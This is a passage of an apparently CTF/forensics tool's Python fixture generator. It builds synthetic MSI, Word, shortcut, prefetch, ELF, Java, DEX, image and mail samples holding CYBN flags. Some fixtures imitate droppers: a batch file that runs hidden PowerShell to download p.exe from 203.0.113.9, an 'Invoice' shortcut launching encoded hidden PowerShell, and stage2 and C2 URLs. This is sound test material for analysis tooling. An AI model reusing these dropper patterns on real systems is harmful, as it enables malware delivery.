    strings = [
        "INSTALLDIR",
        "ProductName",
        "ctfc demo installer",
        "RunHidden",
        f"powershell.exe -nop -w hidden -enc {encoded}",
        "http://203.0.113.9/stage2.ps1",
        "payload.exe",
        "CYBN{msi_string_pool}",
    ]
    data = "".join(strings).encode()
    pool = struct.pack("<HH", 1252, 0)  # the code page lives in the first pair
    for value in strings:
        pool += struct.pack("<HH", len(value.encode()), 1)
    cabinet = cab_write([("payload.exe", b"MZ\x90\x00 CYBN{msi_cabinet}\n")], "stored")
    entries = [
        (encode_name("_StringData"), data),
        (encode_name("_StringPool"), pool),
        (encode_name("_Tables"), "".join(strings[:4]).encode("utf-16-le")),
        (encode_name("CustomAction"), bytes([1, 0, 2, 0])),
        (encode_name("Property"), bytes([3, 0])),
        (encode_name("Binary.payload"), b"MZ" + bytes(200)),
        ("#_disk1.cab", cabinet),
        ("\x05SummaryInformation", bytes(96)),
    ]
    return cfb_write_tree(entries)


def ole10native(name: str, source_path: str, payload: bytes) -> bytes:
    """An `\x01Ole10Native` stream: the names, then the embedded file itself."""
    label = name.encode("cp1252") + b"\x00"
    source = source_path.encode("cp1252") + b"\x00"
    temp = b"C:\\Users\\author\\AppData\\Local\\Temp\\" + name.encode("cp1252") + b"\x00"
    body = (
        struct.pack("<H", 2)
        + label
        + source
        + struct.pack("<II", 0, 0)
        + temp
        + struct.pack("<I", len(payload))
        + payload
    )
    return struct.pack("<I", len(body)) + body


def document_with_embedded_object() -> bytes:
    """A .doc whose real payload is an embedded object, not a macro.

    `ObjectPool/_1234567890/\x01Ole10Native` is where Word puts a file that was
    dragged into the document. The file is still there, with the path it came
    from on the author's machine.
    """
    payload = (
        b"@echo off\r\n"
        b"rem CYBN{embedded_object}\r\n"
        b'powershell -nop -w hidden -c "iwr http://203.0.113.9/p.exe -OutFile %TEMP%\\p.exe"\r\n'
    )
    entries = [
        ("WordDocument", b"\xec\xa5\xc1\x00" + bytes(600)),
        ("1Table", bytes(300)),
        (
            "ObjectPool/_1234567890/\x01Ole10Native",
            ole10native("update.bat", r"C:\Users\author\Desktop\update.bat", payload),
        ),
        ("ObjectPool/_1234567890/\x01CompObj", bytes(76)),
    ]
    return cfb_write_tree(entries)


def write_compound_fixtures() -> None:
    """Outlook .msg, Windows Installer .msi, and a .doc with an embedded object."""
    write("compound_message.msg", outlook_msg())
    write("compound_installer.msi", installer_msi())
    write("compound_embedded.doc", document_with_embedded_object())


# ---------------------------------------------------------------------------
# Windows artefacts (ideas.md 2.4): a shortcut, a prefetch file, a jump list.
#
# The prefetch writer is checked against libscca (`pyscca`, installed on this
# machine): the test opens the fixture with it and compares every field. The
# shortcut is checked against `file`, which parses .lnk flags and strings.
# ---------------------------------------------------------------------------

CLSID_LNK = bytes.fromhex("0114020000000000c000000000000046")
FILETIME_EPOCH_OFFSET = 11644473600


def filetime(unix_seconds: int) -> int:
    """A Unix time as a Windows FILETIME: 100-nanosecond ticks since 1601."""
    return (unix_seconds + FILETIME_EPOCH_OFFSET) * 10_000_000


def lnk_counted(text: str, unicode: bool = True) -> bytes:
    """One StringData field: a *character* count, then the characters."""
    raw = text.encode("utf-16-le" if unicode else "cp1252")
    return struct.pack("<H", len(text)) + raw


def lnk_link_info(
    local_path: str,
    suffix: str = "",
    serial: int = 0x1A2B3C4D,
    label: str = "USB_STICK",
    drive_type: int = 2,
) -> bytes:
    """A LinkInfo structure with a VolumeID and an ANSI local base path."""
    header_size = 0x1C
    volume_label = label.encode("cp1252") + b"\x00"
    volume = struct.pack("<IIII", 16 + len(volume_label), drive_type, serial, 16) + volume_label
    path = local_path.encode("cp1252") + b"\x00"
    suffix_bytes = suffix.encode("cp1252") + b"\x00"
    volume_offset = header_size
    path_offset = volume_offset + len(volume)
    suffix_offset = path_offset + len(path)
    total = suffix_offset + len(suffix_bytes)
    head = struct.pack(
        "<IIIIIII", total, header_size, 0x0001, volume_offset, path_offset, 0, suffix_offset
    )
    return head + volume + path + suffix_bytes


def lnk_tracker_block(machine: str) -> bytes:
    """The tracker block: the NetBIOS name of the machine that made the shortcut."""
    body = struct.pack("<II", 0x58, 0) + machine.encode("cp1252").ljust(16, b"\x00")
    body += bytes(64)  # the two droid GUIDs
    return struct.pack("<II", 8 + len(body), 0xA0000003) + body


def make_lnk(
    target: str,
    arguments: str = "",
    description: str = "",
    working_directory: str = "",
    icon: str = "",
    machine: str = "DESKTOP-CTF01",
    target_size: int = 0,
) -> bytes:
    """A Windows shortcut, as MS-SHLLINK describes one. `file` reads these."""
    flags = 0x00000002 | 0x00000080  # HasLinkInfo | IsUnicode
    if description:
        flags |= 0x00000004
    if working_directory:
        flags |= 0x00000010
    if arguments:
        flags |= 0x00000020
    if icon:
        flags |= 0x00000040
    header = struct.pack(
        "<I16sIIQQQIiIHHI",
        0x4C,
        CLSID_LNK,
        flags,
        0x20,  # FILE_ATTRIBUTE_ARCHIVE
        filetime(1_700_000_000),
        filetime(1_700_000_100),
        filetime(1_700_000_200),
        target_size,
        0,
        1,  # show the window normally
        0,
        0,
        0,
    ) + struct.pack("<I", 0)
    strings = b""
    for text in (description, "", working_directory, arguments, icon):
        if text:
            strings += lnk_counted(text)
    extra = lnk_tracker_block(machine) + struct.pack("<I", 0)
    return header + lnk_link_info(target) + strings + extra


def make_prefetch(
    name: str,
    files: list[str],
    run_count: int = 3,
    runs: list[int] | None = None,
    version: int = 26,
    volume: str = "\\VOLUME{01d9c0b2-0000-0000-0000-100000000000}",
    serial: int = 0xDEADBEEF,
) -> bytes:
    """An uncompressed prefetch file. libscca reads versions 17, 23 and 26.

    Windows 10 writes the same layout but MAM-compressed (LZXPRESS Huffman),
    which ctfc does not decode - so the fixture is a version 26 file, and the
    test opens it with libscca to check every field we claim to read.
    """
    runs = runs or [1_700_000_000, 1_699_900_000]
    strings = b""
    offsets = []
    for path in files:
        offsets.append(len(strings))
        strings += path.encode("utf-16-le") + b"\x00\x00"

    header_size = 84
    info_size = {17: 68, 23: 156, 26: 224, 30: 224, 31: 224}[version]
    metrics_offset = header_size + info_size
    metrics = b""
    for path, offset in zip(files, offsets, strict=True):
        if version >= 23:
            metrics += struct.pack("<IIIIIIQ", 0, 0, 0, offset // 2, len(path), 0, 0)
        else:
            metrics += struct.pack("<IIIII", 0, 0, offset // 2, len(path), 0)
    chains_offset = metrics_offset + len(metrics)
    strings_offset = chains_offset  # no trace chains in the fixture
    volumes_offset = strings_offset + len(strings)

    device = volume.encode("utf-16-le") + b"\x00\x00"
    volume_block_size = 0x60 + len(device)
    volume_block = (
        struct.pack(
            "<IIQIIIIII",
            0x60,  # the device path starts here, inside this block
            len(volume),
            filetime(1_690_000_000),
            serial,
            volume_block_size,
            0,
            volume_block_size,
            0,
            0,
        ).ljust(0x60, b"\x00")
        + device
    )
    total = volumes_offset + len(volume_block)

    info = bytearray(info_size)
    struct.pack_into(
        "<IIIIIIIII",
        info,
        0,
        metrics_offset,
        len(files),
        chains_offset,
        0,
        strings_offset,
        len(strings),
        volumes_offset,
        1,
        len(volume_block),
    )
    if version == 17:
        struct.pack_into("<Q", info, 0x24, filetime(runs[0]))
        struct.pack_into("<I", info, 0x3C, run_count)
    else:
        for index, when in enumerate(runs[: 1 if version == 23 else 8]):
            struct.pack_into("<Q", info, 0x2C + index * 8, filetime(when))
        # Windows 7 keeps the run count at 0x44 of this block and Windows 8.1 at
        # 0x7c. Both were *measured* against libscca rather than guessed.
        struct.pack_into("<I", info, 0x44 if version == 23 else 0x7C, run_count)

    header = bytearray(header_size)
    struct.pack_into("<I4sII", header, 0, version, b"SCCA", 0x11, total)
    encoded = name.encode("utf-16-le")[:58]
    header[0x10 : 0x10 + len(encoded)] = encoded
    struct.pack_into("<I", header, 0x4C, 0x1A2B3C4D)
    return bytes(header) + bytes(info) + metrics + strings + volume_block


def jump_list(entries: list[tuple[str, str]]) -> bytes:
    """An automaticDestinations-ms jump list: a DestList plus one .lnk per entry.

    Windows names the entry streams with hexadecimal digits in creation order
    and keeps the display order in the DestList stream.
    """
    streams: list[tuple[str, bytes]] = []
    destlist = bytearray(struct.pack("<IIII", 1, len(entries), 0, 1) + bytes(16))
    for index, (target, description) in enumerate(entries):
        streams.append((f"{index + 1:x}", make_lnk(target, description=description)))
        destlist += bytes(96) + target.encode("utf-16-le") + b"\x00\x00"
    streams.append(("DestList", bytes(destlist)))
    return cfb_write_tree(streams)


def write_winartifact_fixtures() -> None:
    """A malicious shortcut, a prefetch file and a jump list."""
    command = "Write-Host 'CYBN{lnk_encoded_command}'"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
    write(
        "winartifact_dropper.lnk",
        make_lnk(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            f"-nop -w hidden -enc {encoded}",
            description="Invoice March 2026",
            working_directory="C:\\Users\\victim\\Downloads",
            icon="%SystemRoot%\\System32\\shell32.dll",
            target_size=452608,
        ),
    )
    write(
        "winartifact_powershell.pf",
        make_prefetch(
            "POWERSHELL.EXE",
            [
                "\\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE",
                "\\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32\\NTDLL.DLL",
                "\\DEVICE\\HARDDISKVOLUME1\\USERS\\VICTIM\\DOWNLOADS\\STAGE2.PS1",
                "\\DEVICE\\HARDDISKVOLUME1\\USERS\\VICTIM\\APPDATA\\LOCAL\\TEMP\\CYBN_PREFETCH.TXT",
            ],
            run_count=7,
            version=26,
        ),
    )
    write(
        "winartifact_jumplist.automaticDestinations-ms",
        jump_list(
            [
                ("C:\\Users\\victim\\Documents\\notes.txt", "notes"),
                ("D:\\secret\\CYBN_jumplist.docx", "the one that matters"),
            ]
        ),
    )


# ---------------------------------------------------------------------------
# The executables that are not PEs (ideas.md 3.1 and 3.2): an ELF, a Java class
# and a JAR, an Android DEX.
#
# The Java ones are written by hand *and* checked against the JDK: the test
# compares our constant pool against `javap -v` on a class the JDK compiles from
# source. The ELF reader is checked against the system's own binaries (/bin/ls
# and friends) and `readelf`; the fixture here exists so the parsing has a
# deterministic, self-contained case and the fuzzer has a seed.
# ---------------------------------------------------------------------------


def elf64_binary(
    needed: list[str] | None = None,
    runpath: str = "",
    rwx_segment: bool = True,
    overlay: bytes = b"",
    secret: bytes = b"",
) -> bytes:
    """A small but structurally real ELF64 executable.

    Enough of one to exercise the triage: a loadable segment (writable *and*
    executable, which is the packer signal), an interpreter, a dynamic table
    naming its libraries, a `.dynstr`/`.dynsym` pair, and optionally bytes
    appended after everything, which is the case no normal tool mentions.
    """
    needed = needed or ["libc.so.6", "libcrypto.so.3"]
    interpreter = b"/lib64/ld-linux-x86-64.so.2\x00"

    # --- the string table the dynamic entries point into
    dynstr = b"\x00"
    offsets = {}
    for name in [*needed, runpath] if runpath else needed:
        offsets[name] = len(dynstr)
        dynstr += name.encode() + b"\x00"
    symbols = ["EVP_DecryptInit_ex", "PKCS5_PBKDF2_HMAC", "getenv", "mprotect"]
    symbol_offsets = {}
    for name in symbols:
        symbol_offsets[name] = len(dynstr)
        dynstr += name.encode() + b"\x00"

    dynsym = bytes(24)  # the first entry is always empty
    for name in symbols:
        dynsym += struct.pack("<IBBHQQ", symbol_offsets[name], 0x12, 0, 0, 0, 0)

    dynamic = b""
    for name in needed:
        dynamic += struct.pack("<QQ", 1, offsets[name])  # DT_NEEDED
    if runpath:
        dynamic += struct.pack("<QQ", 29, offsets[runpath])  # DT_RUNPATH
    dynamic += struct.pack("<QQ", 0, 0)  # DT_NULL

    # --- the section name table
    names = [
        "",
        ".interp",
        ".text",
        ".dynstr",
        ".dynsym",
        ".dynamic",
        ".data",
        ".shstrtab",
    ]
    shstrtab = b""
    name_offsets = {}
    for name in names:
        name_offsets[name] = len(shstrtab)
        shstrtab += name.encode() + b"\x00"

    # --- lay the file out: header, program headers, then the section contents
    header_size = 64
    ph_entry = 56
    ph_count = 3
    body_start = header_size + ph_entry * ph_count
    blocks: list[tuple[str, bytes, int, int]] = []  # (name, data, type, flags)
    text = b"\x48\x31\xc0\xc3" * 32 + secret
    blocks.append((".interp", interpreter, 1, 0x2))
    blocks.append((".text", text, 1, 0x2 | 0x4))
    blocks.append((".dynstr", dynstr, 3, 0x2))
    blocks.append((".dynsym", dynsym, 11, 0x2))
    blocks.append((".dynamic", dynamic, 6, 0x2 | 0x1))
    blocks.append((".data", b"CYBN_data\x00" + bytes(16), 1, 0x2 | 0x1))
    blocks.append((".shstrtab", shstrtab, 3, 0))

    offset = body_start
    placed = []
    for name, payload, kind, flags in blocks:
        placed.append((name, payload, kind, flags, offset))
        offset += len(payload)
    sh_offset = offset
    sh_count = len(placed) + 1  # plus the empty section 0

    sections = bytes(64)  # section 0 is all zeros, by definition
    dynstr_index = [name for name, *_rest in placed].index(".dynstr") + 1
    for name, payload, kind, flags, at in placed:
        # A symbol or dynamic section has to say which string table names it
        # (sh_link) and how big its entries are (sh_entsize), or readelf
        # complains - and a tool that complains about the fixture is a tool
        # that cannot be used to check it.
        link = dynstr_index if name in (".dynsym", ".dynamic") else 0
        entry_size = {".dynsym": 24, ".dynamic": 16}.get(name, 0)
        sections += struct.pack(
            "<IIQQQQIIQQ",
            name_offsets[name],
            kind,
            flags,
            0x400000 + at,  # address
            at,
            len(payload),
            link,
            0,
            1,
            entry_size,
        )

    interp_at = next(at for name, _p, _k, _f, at in placed if name == ".interp")
    dynamic_at = next(at for name, _p, _k, _f, at in placed if name == ".dynamic")
    dynamic_size = next(len(p) for name, p, _k, _f, _at in placed if name == ".dynamic")
    program_headers = b""
    # PT_PHDR-less and simple on purpose: one LOAD, the interpreter, the dynamic table.
    program_headers += struct.pack(
        "<IIQQQQQQ",
        1,  # PT_LOAD
        0x5 | (0x2 if rwx_segment else 0),  # R-X, or RWX when asked
        0,
        0x400000,
        0x400000,
        sh_offset,
        sh_offset,
        0x1000,
    )
    program_headers += struct.pack(
        "<IIQQQQQQ",
        3,
        0x4,
        interp_at,
        0x400000 + interp_at,
        0,
        len(interpreter),
        len(interpreter),
        1,
    )
    program_headers += struct.pack(
        "<IIQQQQQQ",
        2,  # PT_DYNAMIC
        0x6,
        dynamic_at,
        0x400000 + dynamic_at,
        0,
        dynamic_size,
        dynamic_size,
        8,
    )

    header = bytearray(64)
    header[0:4] = b"\x7fELF"
    header[4] = 2  # 64-bit
    header[5] = 1  # little endian
    header[6] = 1  # version
    header[7] = 0  # System V ABI
    struct.pack_into(
        "<HHIQQQIHHHHHH",
        header,
        16,
        2,  # ET_EXEC
        0x3E,  # x86-64
        1,
        0x400000 + body_start,  # entry point
        header_size,  # program header offset
        sh_offset,
        0,  # flags
        header_size,
        ph_entry,
        ph_count,
        64,  # section header entry size
        sh_count,
        sh_count - 1,
    )  # the string table is the last section
    body = b"".join(payload for _n, payload, _k, _f, _at in placed)
    return bytes(header) + program_headers + body + sections + overlay


def java_constant(tag: int, payload: bytes) -> bytes:
    return bytes([tag]) + payload


def java_utf8(text: str) -> bytes:
    raw = text.encode("utf-8")
    return java_constant(1, struct.pack(">H", len(raw)) + raw)


def java_class(name: str, literals: list[str], classes: list[str]) -> bytes:
    """A Java class file holding the given literals in its constant pool.

    Written by hand, but the test checks a *JDK-compiled* class against `javap`
    as well, so the reader is not only ever tested against our own writer.
    """
    pool = b""
    index = 1
    utf8_index: dict[str, int] = {}

    def add_utf8(text: str) -> int:
        nonlocal pool, index
        if text in utf8_index:
            return utf8_index[text]
        pool += java_utf8(text)
        utf8_index[text] = index
        index += 1
        return utf8_index[text]

    this_name = add_utf8(name)
    object_name = add_utf8("java/lang/Object")
    class_indexes = []
    for other in classes:
        class_indexes.append(add_utf8(other))
    literal_indexes = [add_utf8(text) for text in literals]
    code_name = add_utf8("Code")

    # The Class and String constants that point at those UTF-8 entries.
    this_class = index
    pool += java_constant(7, struct.pack(">H", this_name))
    index += 1
    super_class = index
    pool += java_constant(7, struct.pack(">H", object_name))
    index += 1
    for target in class_indexes:
        pool += java_constant(7, struct.pack(">H", target))
        index += 1
    for target in literal_indexes:
        pool += java_constant(8, struct.pack(">H", target))
        index += 1

    header = struct.pack(">IHH", 0xCAFEBABE, 0, 61) + struct.pack(">H", index)
    body = struct.pack(
        ">HHHHHHH",
        0x0021,  # public super
        this_class,
        super_class,
        0,  # interfaces
        0,  # fields
        0,  # methods
        0,  # attributes
    )
    assert code_name  # kept in the pool: a real class always has it
    return header + pool + body


def java_jar(classes: list[tuple[str, bytes]], main_class: str) -> bytes:
    """A JAR: a ZIP of class files plus a manifest naming the entry point."""
    buffer = io.BytesIO()
    manifest = f"Manifest-Version: 1.0\r\nMain-Class: {main_class}\r\n\r\n"
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        info = zipfile.ZipInfo("META-INF/MANIFEST.MF", date_time=(2026, 1, 1, 0, 0, 0))
        archive.writestr(info, manifest)
        for name, payload in classes:
            info = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            archive.writestr(info, payload)
    return buffer.getvalue()


def dex_file(strings: list[str], types: list[str]) -> bytes:
    """A minimal Android DEX holding a string table and a type table.

    The header's checksum (adler32 of everything after it) and signature (SHA-1
    of everything after the signature field) are computed properly, so the
    integrity checks a real tool makes do pass.
    """
    every = strings + types
    data = b""
    offsets = []
    for text in every:
        offsets.append(len(data))
        raw = text.encode("utf-8")
        data += bytes([len(text)]) + raw + b"\x00"  # ULEB128 for lengths under 128

    header_size = 112
    string_ids_off = header_size
    type_ids_off = string_ids_off + 4 * len(every)
    data_off = type_ids_off + 4 * len(types)
    string_ids = b"".join(struct.pack("<I", data_off + offset) for offset in offsets)
    # A type id is an *index into the string table*, which is why the class
    # names come out of the strings the reader already has.
    type_ids = b"".join(struct.pack("<I", len(strings) + i) for i in range(len(types)))

    total = data_off + len(data)
    header = bytearray(header_size)
    header[0:8] = b"dex\n035\x00"
    struct.pack_into("<I", header, 32, total)
    struct.pack_into("<I", header, 36, header_size)
    struct.pack_into("<I", header, 40, 0x12345678)
    struct.pack_into("<II", header, 56, len(every), string_ids_off)
    struct.pack_into("<II", header, 64, len(types), type_ids_off)
    struct.pack_into("<II", header, 104, len(data), data_off)
    body = bytes(header) + string_ids + type_ids + data
    signature = hashlib.sha1(body[32:]).digest()  # noqa: S324 - the format says SHA-1
    body = body[:12] + signature + body[32:]
    checksum = zlib.adler32(body[12:]) & 0xFFFFFFFF
    return body[:8] + struct.pack("<I", checksum) + body[12:]


def write_executable_fixtures() -> None:
    """An ELF, a Java class, a JAR and a DEX."""
    write(
        "executable_dropper.elf",
        elf64_binary(
            needed=["libc.so.6", "libcrypto.so.3"],
            runpath="/tmp/lib",
            rwx_segment=True,
            overlay=small_zip("payload.txt", b"CYBN{elf_overlay}"),
            secret=b"CYBN_elf_text\x00",
        ),
    )
    first = java_class(
        "Secret",
        ["AES/CBC/PKCS5Padding", "0123456789abcdef", "CYBN{java_literal}"],
        ["javax/crypto/Cipher", "javax/crypto/spec/SecretKeySpec", "java/util/Base64"],
    )
    write("executable_secret.class", first)
    second = java_class("Helper", ["http://10.0.0.5/stage2"], ["java/net/URL"])
    write(
        "executable_secret.jar",
        java_jar([("Secret.class", first), ("Helper.class", second)], "Secret"),
    )
    write(
        "executable_app.dex",
        dex_file(
            [
                "AES/CBC/NoPadding",
                "CYBN{dex_string_table}",
                "doFinal",
                "javax/crypto/Cipher",
                "http://10.0.0.9/c2",
            ],
            ["Lcom/example/Main;", "Ljava/lang/String;"],
        ),
    )


# ---------------------------------------------------------------------------
# The encoding long tail (ideas.md 3.3). Each fixture is produced by this
# module's own encoder and read back by the decoder in `core/encodings.py`,
# except base45, which is also checked against RFC 9285's published test
# vectors in the tests - the strongest check available for these.
# ---------------------------------------------------------------------------


def write_longtail_fixtures() -> None:
    """Base45 / basE91 / Z85 / uuencode, and the keyless classical encodings."""
    from ctfc.core.encodings import (
        bacon_encode,
        base45_encode,
        base91_encode,
        morse_encode,
        square_encode,
        z85_encode,
    )

    message = b"CYBN{the_long_tail_of_encodings} and a sentence so the scoring has text."
    write("longtail_base45.txt", base45_encode(message) + "\n")
    write("longtail_base91.txt", base91_encode(message) + "\n")
    # Z85 only encodes whole groups of four bytes, so the message is padded.
    write("longtail_z85.txt", z85_encode(message + b" " * (-len(message) % 4)) + "\n")
    uu = b"begin 644 flag.txt\n"
    uu += b"".join(binascii.b2a_uu(message[at : at + 45]) for at in range(0, len(message), 45))
    uu += b"`\nend\n"
    write("longtail_uu.txt", uu)

    # Morse, Bacon, Polybius, tap code and A1Z26 cannot carry braces, so the
    # flag is written as one word - which is how a challenge hands it over too.
    write("longtail_morse.txt", morse_encode("CYBNFLAG IN MORSE CODE") + "\n")
    write("longtail_bacon.txt", bacon_encode("CYBNFLAGINBACON") + "\n")
    write("longtail_polybius.txt", square_encode("CYBNFLAGINPOLYBIUS") + "\n")
    taps = square_encode("CYBNFLAGINTAPCODE")
    write("longtail_tap.txt", " ".join("." * int(digit) for digit in taps) + "\n")
    write(
        "longtail_a1z26.txt",
        " / ".join(
            "-".join(str(ord(char) - 64) for char in word)
            for word in ("CYBNFLAG", "IN", "A", "ONE", "Z", "TWENTYSIX")
        )
        + "\n",
    )

    # A Beaufort cipher: the same function encrypts and decrypts, so this is
    # `beaufort_decrypt` applied once to the plaintext.
    from ctfc.core.classical import beaufort_decrypt

    plain = (
        b"It is a truth universally acknowledged that a single man in possession of a good "
        b"fortune must be in want of a wife. However little known the views of such a man "
        b"may be on his first entering a neighbourhood, this truth is so well fixed in the "
        b"minds of the surrounding families. The flag is CYBN{beaufort_subtracts} here."
    )
    write("classical_beaufort.txt", beaufort_decrypt(plain, "lemon"))



# ---------------------------------------------------------------------------
# A photograph with EXIF (and a GPS point)
# ---------------------------------------------------------------------------
#
# Built by hand so that it is deterministic and needs no imagemagick: a JPEG is
# SOI, then segments, then EOI, and EXIF is a whole little-endian TIFF inside
# the APP1 segment. The test checks this fixture against `exiftool`, which is
# the only way to know the bytes mean what we think they mean.


def tiff_entry(tag: int, kind: int, count: int, payload: bytes) -> bytes:
    """One 12-byte IFD entry. `payload` is the value, or the offset, already packed."""
    return struct.pack("<HHI", tag, kind, count) + payload[:4].ljust(4, b"\x00")


def exif_jpeg() -> bytes:
    """A JPEG whose EXIF holds a camera, a date, a flag in UserComment and a GPS point."""
    # The TIFF block is assembled back to front: the values that do not fit in
    # four bytes live after the directories, at an offset from the TIFF header.
    header = b"II\x2a\x00" + struct.pack("<I", 8)
    strings = {
        "make": b"ctfcCam\x00",
        "model": b"Model X1\x00",
        "software": b"ctfc fixture\x00",
        "date": b"2024:05:17 09:30:00\x00",
        "comment": b"ASCII\x00\x00\x00CYBN{exif_user_comment}",
    }
    # Latitude 48 deg 51' 30.12" N, longitude 2 deg 17' 40.13" E (three rationals each).
    gps_latitude = struct.pack("<IIIIII", 48, 1, 51, 1, 3012, 100)
    gps_longitude = struct.pack("<IIIIII", 2, 1, 17, 1, 4013, 100)
    gps_altitude = struct.pack("<II", 35, 1)

    # Lay the value block out and remember where each piece landed.
    ifd0_count, exif_count, gps_count = 5, 2, 7
    ifd0_at = 8
    exif_at = ifd0_at + 2 + ifd0_count * 12 + 4
    gps_at = exif_at + 2 + exif_count * 12 + 4
    values_at = gps_at + 2 + gps_count * 12 + 4
    blob = bytearray()
    where = {}
    for name, payload in strings.items():
        where[name] = values_at + len(blob)
        blob += payload
    for name, payload in (
        ("lat", gps_latitude),
        ("lon", gps_longitude),
        ("alt", gps_altitude),
    ):
        where[name] = values_at + len(blob)
        blob += payload

    def offset(name: str) -> bytes:
        return struct.pack("<I", where[name])

    ifd0 = struct.pack("<H", ifd0_count)
    ifd0 += tiff_entry(0x010F, 2, len(strings["make"]), offset("make"))
    ifd0 += tiff_entry(0x0110, 2, len(strings["model"]), offset("model"))
    ifd0 += tiff_entry(0x0131, 2, len(strings["software"]), offset("software"))
    ifd0 += tiff_entry(0x8769, 4, 1, struct.pack("<I", exif_at))
    ifd0 += tiff_entry(0x8825, 4, 1, struct.pack("<I", gps_at))
    ifd0 += struct.pack("<I", 0)  # no IFD1: no thumbnail

    sub = struct.pack("<H", exif_count)
    sub += tiff_entry(0x9003, 2, len(strings["date"]), offset("date"))
    sub += tiff_entry(0x9286, 7, len(strings["comment"]), offset("comment"))
    sub += struct.pack("<I", 0)

    gps = struct.pack("<H", gps_count)
    gps += tiff_entry(0x0000, 1, 4, bytes([2, 3, 0, 0]))
    gps += tiff_entry(0x0001, 2, 2, b"N\x00")
    gps += tiff_entry(0x0002, 5, 3, offset("lat"))
    gps += tiff_entry(0x0003, 2, 2, b"E\x00")
    gps += tiff_entry(0x0004, 5, 3, offset("lon"))
    gps += tiff_entry(0x0005, 1, 1, bytes([0]))
    gps += tiff_entry(0x0006, 5, 1, offset("alt"))
    gps += struct.pack("<I", 0)

    tiff = header + ifd0 + sub + gps + bytes(blob)
    app1 = b"Exif\x00\x00" + tiff
    segments = b"\xff\xd8"  # SOI
    segments += b"\xff\xe1" + struct.pack(">H", len(app1) + 2) + app1
    comment = b"the flag is not in this comment"
    segments += b"\xff\xfe" + struct.pack(">H", len(comment) + 2) + comment
    # A minimal grey 1x1 scan, so the file is a real JPEG and not only a header.
    quant = b"\xff\xdb" + struct.pack(">H", 67) + b"\x00" + bytes([16] * 64)
    frame = b"\xff\xc0" + struct.pack(">H", 11) + bytes([8, 0, 1, 0, 1, 1, 1, 0x11, 0])
    segments += quant + frame
    segments += b"\xff\xd9"  # EOI
    return segments


def mail_file() -> bytes:
    """A .eml with the ZIP password in the body and a flag in the attachment.

    The shape of a real challenge: the mail and the archive arrive separately,
    and `ctfc workspace` is what puts them together.
    """
    attachment = base64.b64encode(b"CYBN{mail_attachment}")
    return (
        b"From: admin@corp.local\r\n"
        b"To: victim@corp.local\r\n"
        b"Subject: the quarterly backup\r\n"
        b"Date: Fri, 17 May 2024 09:30:00 +0000\r\n"
        b"Message-ID: <fixture@corp.local>\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="ctfc"\r\n'
        b"\r\n"
        b"--ctfc\r\n"
        b"Content-Type: text/plain; charset=utf-8\r\n"
        b"\r\n"
        b"Hello,\r\n\r\nthe password is Tr0ub4dor&3 as agreed. Do not write it down.\r\n"
        b"--ctfc\r\n"
        b"Content-Type: text/plain\r\n"
        b'Content-Disposition: attachment; filename="note.txt"\r\n'
        b"Content-Transfer-Encoding: base64\r\n"
        b"\r\n" + attachment + b"\r\n"
        b"--ctfc--\r\n"
    )


def write_mail_fixtures() -> None:
    print("mail:")
    write("mailfile_message.eml", mail_file())


def write_exif_fixtures() -> None:
    print("exif:")
    write("exif_photo.jpg", exif_jpeg())


def main() -> None:
    FIXTURES.mkdir(exist_ok=True)
    print(f"writing fixtures to {FIXTURES}")

    # Multi-layer encoding: text -> hex -> zlib -> base64
    text = b"Good job, the flag is CYBN{fixture_layers_b64_zlib_hex}"
    write("layers_b64_zlib_hex.txt", base64.b64encode(zlib.compress(text.hex().encode())))

    # Reversed base64 (PowerShell droppers love this)
    write("reversed_b64.txt", base64.b64encode(b"CYBN{fixture_reversed}")[::-1])

    # PowerShell -EncodedCommand: base64 of UTF-16LE
    command = "Write-Host 'CYBN{fixture_encodedcommand}'"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
    write("powershell_encoded.txt", f"powershell.exe -NoP -W Hidden -enc {encoded}\n")

    # AES-ECB with repeated plaintext blocks
    key = RNG.randbytes(16)
    plaintext = b"YELLOW SUBMARINE" * 4 + b"CYBN{fixture_ecb_mode_leaks}"
    write("aes_ecb_repeated.bin", AES.new(key, AES.MODE_ECB).encrypt(pad(plaintext, 16)))

    # openssl enc -aes-256-cbc -md md5 (legacy KDF), raw and base64 versions
    salt = RNG.randbytes(8)
    key, iv = evp_bytes_to_key(b"password123", salt, 32, 16)
    secret = b"CYBN{fixture_openssl_md5}\n"
    blob = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16))
    write("openssl_salted_md5.bin", blob)
    write("openssl_salted_md5.b64", base64.b64encode(blob) + b"\n")

    # PNG with a ZIP appended after IEND (polyglot)
    archive = small_zip("flag.txt", b"CYBN{fixture_polyglot_zip}")
    write("png_with_zip.png", tiny_png() + archive)

    # Zero-width steganography in normal text
    cover = "Nothing to see here, just a normal sentence about the weather."
    write("zero_width.txt", hide_zero_width(cover, b"CYBN{zero_width}"))

    # Binary with crypto constants: TEA delta (LE) and the AES S-box
    sbox_start = bytes.fromhex("637c777bf26b6fc53001672bfed7ab76")
    binary = RNG.randbytes(300) + struct.pack("<I", 0x9E3779B9) + RNG.randbytes(200)
    write("crypto_constants.bin", binary + sbox_start + RNG.randbytes(100))

    # Repeating-key XOR of English text (key length 6)
    xor_key = b"x0rK3y"
    xored = bytes(byte ^ xor_key[i % len(xor_key)] for i, byte in enumerate(ENGLISH.encode()))
    write("xor_repeating.bin", xored)

    # --- XOR (M2) ---
    write("xor_single_byte.bin", xor(ENGLISH.encode(), b"\x5a"))
    # Two layers: repeating key "secret", then the single byte 0x42
    write("xor_two_layers.bin", xor(xor(ENGLISH.encode(), b"secret"), b"\x42"))
    # A PNG file XORed with a 4-byte key: the PNG header is the known plaintext
    write("xor_png.bin", xor(tiny_png() + RNG.randbytes(64), b"k3y!"))
    # Multi-layer: text -> XOR -> zlib -> base64 (decode: base64, zlib, XOR)
    layered = xor(ENGLISH.replace("xor_repeating", "multi_layer").encode(), b"K3y!")
    write("layers_b64_zlib_xor.txt", base64.b64encode(zlib.compress(layered)) + b"\n")
    # PowerShell dropper: strings XORed with 0x5A inside, whole script XORed
